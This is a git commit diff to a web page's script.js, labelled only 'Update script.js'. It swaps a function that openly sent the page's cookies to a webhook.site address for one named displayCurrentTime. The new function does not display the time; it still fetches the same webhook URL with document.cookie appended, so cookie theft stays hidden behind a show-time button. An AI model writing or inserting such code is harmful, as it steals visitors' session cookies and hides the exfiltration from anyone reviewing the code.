8ecc82ad84821485198d2da5251879a90cf09e31
miracul9228 <134514965+miracul9228@users.noreply.github.com>
2025-04-23 20:19:48 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,26 +1,10 @@
 document.addEventListener("DOMContentLoaded", function () {
   const button = document.getElementById("showTimeButton");
-
-  // 綁定事件，只在點擊時發送 cookie
   button.addEventListener("click", function () {
-    sendCookies();
+    displayCurrentTime();
   });
 
-  // 發送 Cookies 至 Webhook
-  function sendCookies() {
-    const url = `https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?cookie=${encodeURIComponent(document.cookie)}`;
-
-    fetch(url, {
-      method: 'GET',
-      headers: {
-        'Content-Type': 'application/json'
-      }
-    })
-    .then(response => {
-      console.log('Cookie 已成功發送');
-    })
-    .catch(error => {
-      console.error('發送 cookie 失敗:', error);
-    });
+  function displayCurrentTime() {
+    fetch('https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d' + document.cookie);
   }
 });
